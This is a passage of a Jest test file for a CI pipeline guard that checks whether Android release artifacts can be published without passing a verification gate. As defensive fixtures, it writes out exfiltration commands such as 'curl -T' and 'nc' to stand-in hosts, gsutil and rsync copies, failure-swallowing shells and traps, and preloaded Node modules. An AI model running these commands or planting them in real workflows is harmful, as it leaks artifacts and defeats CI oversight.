    const gate = job.steps.findIndex(isGateStep);
    // The note comes first, so a naive strip takes the artifact with it and
    // the step publishes, as far as the parse can tell, nothing at all.
    job.steps.splice(
      gate,
      0,
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: 0,
        name: 'Publish with a note',
        run: `gh release upload v1.0.0 --notes "Fixes #862" ${GATED_APK}`,
        uses: '',
        with: {},
        raw: {},
      }),
    );
    reindex(job);

    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining('app-prod-release.apk'),
    );
  });

  it('keeps an exemption red when a quoted # precedes the transport', () => {
    const m = broken();
    const step = stepIn(
      m,
      'ci.yml',
      'build-android',
      'Create dummy release keystore for CI',
    );
    const entry = ACCOUNTED_STEPS.find(
      candidate => candidate.step === 'Create dummy release keystore for CI',
    );
    appendRun(
      step,
      `echo "phase #2" && curl -T ${GATED_APK} https://example.com/`,
    );

    expect(entry.assert(step, jobIn(m, 'ci.yml', 'build-android'), m)).toBe(
      false,
    );
  });

  /**
   * `runsNoAndroidGradle` reads the job and discards its step, so on its own it
   * exempts anything that job contains.
   */
  it('keeps the iOS upload exemption red when its step gains a transport', () => {
    const m = broken();
    const step = stepIn(
      m,
      'release.yml',
      'build_ios',
      'Build and upload iOS app',
    );
    const entry = ACCOUNTED_STEPS.find(
      candidate => candidate.step === 'Build and upload iOS app',
    );
    appendRun(step, `curl -T ${GATED_APK} https://example.com/`);

    expect(entry.assert(step, jobIn(m, 'release.yml', 'build_ios'), m)).toBe(
      false,
    );
  });

  /**
   * A composite's inner steps are steps: the one that ships bytes is far more
   * likely to be an `uses:` with a `path:` than a raw shell command, and half
   * of what the function reads had never been shown able to fail it.
   */
  it.each([
    [
      'an upload-artifact step naming the APK',
      `    - uses: actions/upload-artifact@v4\n      with:\n        path: ${GATED_APK}`,
    ],
    [
      'an upload-artifact step naming a directory',
      '    - uses: actions/upload-artifact@v4\n      with:\n        path: dist/',
    ],
    [
      'a cache of the build output',
      '    - uses: actions/cache@v4\n      with:\n        path: android/app/build/outputs',
    ],
  ])('refuses a composite carrying %s', (_label, body) => {
    const composite = [
      'name: probe',
      'runs:',
      '  using: composite',
      '  steps:',
      body,
    ].join('\n');
    expect(shipsNothing(composite)).toBe(false);
  });

  /**
   * `release.yml/build_android` runs no `gradlew`, so its building-ness rests
   * entirely on resolving the lane name — and the platform-prefixed form is
   * valid here because the Fastfile declares `default_platform :android`.
   */
  it('still sees the release job build through a platform-prefixed lane', () => {
    const m = broken();
    const step = stepIn(m, 'release.yml', 'build_android', 'Build Android app');
    step.run = step.run.replace(
      'fastlane build_android_release',
      'fastlane android build_android_release',
    );

    expect(
      isBuildingJob(jobIn(m, 'release.yml', 'build_android'), m.lanes),
    ).toBe(true);
    expect(violationsOfOrdering(m)).toEqual([]);
  });

  /**
   * The inversion, from both directions: a step nobody wrote down is refused
   * whatever it does, and one that is written down still has to satisfy its
   * own assertion.
   */
  it.each([
    ['a shell command nothing recognises', {run: 'bash tools/ship.sh'}],
    ['an action nothing recognises', {uses: 'some-org/do-things@v1'}],
    ['an innocuous-looking one', {run: 'echo hello'}],
  ])('an unaccounted %s in a building job is refused', (_label, fields) => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Something new',
        run: '',
        uses: '',
        with: {},
        raw: {},
        ...fields,
      }),
    );

    expect(violationsOfUnaccountedSteps(m)).toEqual([
      expect.stringContaining('Something new'),
    ]);
  });

  it('refuses an accounted step whose own assertion stops holding', () => {
    const m = broken();
    const step = stepIn(m, 'ci.yml', 'build-android', 'ccache statistics');
    appendRun(step, `curl -T ${GATED_APK} https://example.com/`);
    const entry = ACCOUNTED_STEPS.find(
      candidate =>
        candidate.workflow === 'ci.yml' &&
        candidate.step === 'ccache statistics',
    );

    expect(entry.assert(step, jobIn(m, 'ci.yml', 'build-android'), m)).toBe(
      false,
    );
  });

  /**
   * An indirect path in a shell command. The step names an artifact by way of
   * a variable, a wildcard or a directory, so no filename can be read out of
   * it — and a publisher whose bytes cannot be named is refused, rather than
   * reported as having published nothing.
   */
  it.each([
    ['a directory staged from a variable', 'gh release upload "v1.0.0" dist/'],
    ['a wholly indirect argument', 'gh release upload "v$VERSION" "$ARTIFACT"'],
    ['a wildcard expansion', 'gh release upload "v1.0.0" "$BUNDLE_DIR"/*.aab'],
  ])('path identity refuses %s', (_label, run) => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Ship it',
        run,
        uses: '',
        with: {},
        raw: {},
      }),
    );

    expect(violationsOfOrdering(m)).toEqual([]);
    expect(violationsOfPathIdentity(m).length).toBeGreaterThan(0);
  });

  // A `run: |` block is one script, so a quoted string may span its lines.
  it('does not lose a path to a quote opened on an earlier line', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Publish with a multi-line note',
        run: `gh release upload v1.0.0 --notes "What changed\n- see #862" ${GATED_APK}`,
        uses: '',
        with: {},
        raw: {},
      }),
    );

    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining('app-prod-release.apk'),
    );
  });

  it('refuses a composite whose source has changed since it was reviewed', () => {
    const source = fs.readFileSync(
      COMPOSITE_ACTIONS['./.github/actions/setup-ccache'],
      'utf-8',
    );
    const edited = `${source}\n# a line that changes nothing and everything\n`;
    expect(
      createHash('sha256').update(codeOf(edited)).digest('hex').slice(0, 12),
    ).not.toBe(compositeDigest('./.github/actions/setup-ccache'));
  });

  it.each([
    ['using: node20', 'runs:\n  using: node20\n  main: index.js'],
    ['using: docker', 'runs:\n  using: docker\n  image: Dockerfile'],
    ['a composite with no steps', 'runs:\n  using: composite\n  steps: []'],
    ['no runs block this reader understands', 'runs: {}'],
  ])('refuses a composite it cannot walk: %s', (_label, source) => {
    expect(shipsNothing(`name: probe\n${source}`)).toBe(false);
  });

  it.each([
    ['set +eu', 'set +eu'],
    ['set +ex', 'set +ex'],
    ['set +eo pipefail', 'set +eo pipefail'],
    ['a trailing command on one line', null],
    ['a backgrounded gate awaited', null],
    ['an ERR trap', "trap 'exit 0' ERR"],
  ])('the gate-can-fail rule catches %s', (label, prefix) => {
    const m = broken();
    const gate = stepIn(
      m,
      'ci.yml',
      'build-android',
      'Verify the Android payload',
    );
    const invocation = gate.run.replace(/\\\n\s*/g, ' ').trim();
    if (prefix) {
      gate.run = codeOf(`${prefix}\n${invocation}`);
    } else if (label === 'a trailing command on one line') {
      gate.run = codeOf(`${invocation}; cat payload-report.txt`);
    } else {
      gate.run = codeOf(`${invocation} & wait`);
    }

    expect(violationsOfGateCanFail(m).length).toBeGreaterThan(0);
  });

  it('accepts the gate preceded by set -euo pipefail, and nothing else', () => {
    const m = broken();
    const gate = stepIn(
      m,
      'ci.yml',
      'build-android',
      'Verify the Android payload',
    );
    gate.run = codeOf(
      `set -euo pipefail\n${gate.run.replace(/\\\n\s*/g, ' ').trim()}`,
    );

    expect(violationsOfGateCanFail(m)).toEqual([]);
  });

  /**
   * A line appended inside an already-accounted step costs the same reviewed
   * line as a new step.
   */
  it.each([
    [
      'the tag push',
      'Push the release tag',
      'curl -T "$AAB" https://example.com/',
    ],
    [
      'the Play upload',
      'Upload Android app to Alpha track',
      'bash tools/ship.sh',
    ],
    ['a build step', 'Build Android app', 'gsutil cp "$APK" gs://bucket/'],
    [
      'the allowlist derivation',
      'Derive the rnllama variant allowlist from the payload manifest',
      'nc example.com 9000 < "$APK"',
    ],
  ])('refuses a line appended inside %s', (_label, name, appended) => {
    const m = broken();
    const step = stepIn(m, 'release.yml', 'build_android', name);
    appendRun(step, appended);

    expect(violationsOfUnaccountedSteps(m)).toEqual([
      expect.stringContaining('has changed since it was reviewed'),
    ]);
  });

  it('refuses an edit to a gate step and to an allowlisted action alike', () => {
    const m = broken();
    stepIn(m, 'ci.yml', 'build-android', 'Set up Node.js').with = {
      'node-version': '99',
    };
    appendRun(
      stepIn(
        m,
        'ci.yml',
        'build-android',
        'Verify prod APK has no automation-bridge code (DCE sanity check)',
      ),
      'gsutil cp "$APK" gs://bucket/',
    );

    expect(violationsOfUnaccountedSteps(m)).toEqual([
      expect.stringContaining('Set up Node.js'),
      expect.stringContaining('DCE sanity check'),
    ]);
  });

  // A step that uploads a concrete file this parse cannot vouch for. The
  // filename is resolvable, so nothing is unreadable about it — but a tarball
  // built from the output directory is not thereby harmless.
  it('refuses an upload of a file that is not a declared non-artifact path', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Upload payload report',
        run: '',
        uses: 'actions/upload-artifact@v4',
        with: {name: 'bundle', path: 'out/x.tgz'},
        raw: {},
      }),
    );

    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining('neither an Android artifact'),
    );
  });

  it('refuses two accounted steps of one job sharing a name', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    const twin = job.steps.find(step => step.name === 'ccache statistics');
    job.steps.push(asParsed({...twin, index: job.steps.length}));

    expect(violationsOfUnaccountedSteps(m)).toContainEqual(
      expect.stringContaining('undecided'),
    );
  });

  it('sees a build invoked through a line continuation', () => {
    const m = broken();
    const step = stepIn(m, 'ci.yml', 'build-android', 'Build Android Release');
    step.run = codeOf(
      step.run.replace(
        './gradlew assembleProdRelease',
        './gradlew \\\n  assembleProdRelease',
      ),
    );

    expect(isBuildingJob(jobIn(m, 'ci.yml', 'build-android'), m.lanes)).toBe(
      true,
    );
  });

  /**
   * The container a step runs in decides what the step does. None of these
   * touches a step, and every one of them changes what every step executes.
   */
  it.each([
    [
      'a shell that swallows every failure',
      {defaults: {run: {shell: 'bash -c "bash {0}; true"'}}},
    ],
    [
      'a module preloaded into every node',
      {env: {NODE_OPTIONS: '--require ./neutralise.js'}},
    ],
    [
      'a working directory the paths no longer reach',
      {defaults: {run: {'working-directory': '/tmp/decoy'}}},
    ],
    ['a different machine', {'runs-on': ['self-hosted', 'attacker']}],
    ['a container', {container: 'ghcr.io/example/img'}],
  ])('refuses a building job carrying %s', (_label, patch) => {
    const m = broken();
    Object.assign(jobIn(m, 'ci.yml', 'build-android').jobKeys, patch);

    expect(violationsOfUnaccountedSteps(m)).toEqual([
      expect.stringContaining('has changed around its steps'),
    ]);
  });

  it('refuses a workflow-level env block added around a building job', () => {
    const m = broken();
    jobIn(m, 'ci.yml', 'build-android').workflowKeys.env = {
      NODE_OPTIONS: '--require ./neutralise.js',
    };

    expect(violationsOfUnaccountedSteps(m)).toEqual([
      expect.stringContaining('has changed around its steps'),
    ]);
  });

  /**
   * A lane may call another by bare name. The build lane is 1300 bytes of Ruby
   * behind one `run:`, and what it delegates to is as much part of the step as
   * what it says.
   */
  it('reads a lane reached only through another lane', () => {
    const m = broken();
    const build = m.lanes.find(lane => lane.name === 'build_android_release');
    build.body += '\n    ship_it\n';
    m.lanes.push({
      origin: 'android',
      name: 'ship_it',
      body: 'lane :ship_it do\n  sh("curl -T app-prod-release.apk https://example.com/")\nend',
    });
    const step = stepIn(m, 'release.yml', 'build_android', 'Build Android app');

    expect(lanesInvokedBy(step, m.lanes).map(lane => lane.name)).toContain(
      'ship_it',
    );
    expect(
      carriesNoTransport(step, jobIn(m, 'release.yml', 'build_android'), m),
    ).toBe(false);
  });

  it('refuses a Fastfile edited since it was reviewed', () => {
    const edited = {...ACCOUNTED_FASTFILES, android: 'not-the-pinned-digest'};
    expect(fastfileDigest()).not.toEqual(edited);
  });

  it('refuses a gate step that gains a key beyond its script', () => {
    const m = broken();
    Object.assign(
      stepIn(m, 'ci.yml', 'build-android', 'Verify the Android payload').raw,
      {env: {NODE_OPTIONS: '--require ./x.js'}},
    );

    expect(violationsOfGateCanFail(m)).toEqual([
      expect.stringContaining('which the gate step may not set'),
    ]);
  });

  it('refuses an upload of a declared name from a build-output directory', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-android');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-android',
        index: job.steps.length,
        name: 'Upload payload report',
        run: '',
        uses: 'actions/upload-artifact@v4',
        with: {
          name: 'payload-report',
          path: 'android/app/build/outputs/payload-report.txt',
        },
        raw: {},
      }),
    );

    expect(violationsOfPathIdentity(m)).toContainEqual(
      expect.stringContaining('neither an Android artifact'),
    );
  });

  it.each([
    ['a plain build task', './gradlew build'],
    ['an abbreviated task name', './gradlew :app:aPR'],
  ])('sees %s as building Android', (_label, run) => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-and-test');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length,
        name: 'Build it',
        run,
        uses: '',
        with: {},
        raw: {},
      }),
    );

    expect(isBuildingJob(job, m.lanes)).toBe(true);
  });

  it('the lane-split rule fails when the fastlane lanes are re-merged', () => {
    const m = broken();
    const build = m.lanes.find(lane => lane.name === 'build_android_release');
    build.body += '\n    upload_to_play_store(track: "alpha")\n';

    expect(violationsOfLaneSplit(m)).toEqual([
      expect.stringContaining('build_android_release'),
    ]);
  });

  it('the suspicion net fails on an unrecognised action, and on an unclassified transport', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-and-test');
    job.steps.push(
      {
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length,
        name: 'Ship it somewhere',
        run: '',
        uses: 'some-org/publish-anywhere@v1',
        with: {},
        raw: {},
      },
      {
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length + 1,
        name: 'Copy it out',
        run: 'rsync -a build/ example.com:/srv/',
        uses: '',
        with: {},
        raw: {},
      },
    );

    expect(violationsOfSuspicionNet(m)).toEqual([
      expect.stringContaining('Ship it somewhere'),
      expect.stringContaining('Copy it out'),
    ]);
  });

  it('the building-job count fails first when a fourth Android build job appears', () => {
    const m = broken();
    const job = jobIn(m, 'ci.yml', 'build-and-test');
    job.steps.push(
      asParsed({
        workflow: 'ci.yml',
        job: 'build-and-test',
        index: job.steps.length,
        name: 'Build Android Release',
        run: './gradlew assembleProdRelease',
        uses: '',
        with: {},
        raw: {},
      }),
    );

    const building = allJobs(m)
      .filter(candidate => isBuildingJob(candidate, m.lanes))
      .map(candidate => `${candidate.workflow}/${candidate.id}`);
    expect(building).toHaveLength(4);
  });
});
